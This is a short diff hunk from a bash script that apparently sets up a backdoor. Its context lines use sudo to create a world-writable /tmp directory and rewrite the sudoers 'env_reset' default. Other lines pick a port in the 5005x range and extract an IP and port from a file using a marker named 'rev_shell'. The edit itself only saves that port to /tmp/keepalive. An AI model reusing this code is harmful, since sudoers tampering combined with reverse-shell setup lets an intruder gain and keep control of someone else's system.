@@ -175,7 +175,7 @@ sudo bash -c ' mkdir /tmp/A;chmod 0777 /tmp/A; sed -i "s|Defaults\tenv_reset|Def
          num61z=$(date +%S);
          num67z=$(echo "1"$num61z);
          num76=$((${num67z}%8));
-         bport=5005"$num76";echo $bport;
+         bport=5005"$num76";echo $bport|tee /tmp/keepalive;
 
 ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9)
 port5=${ip_port5#*:};
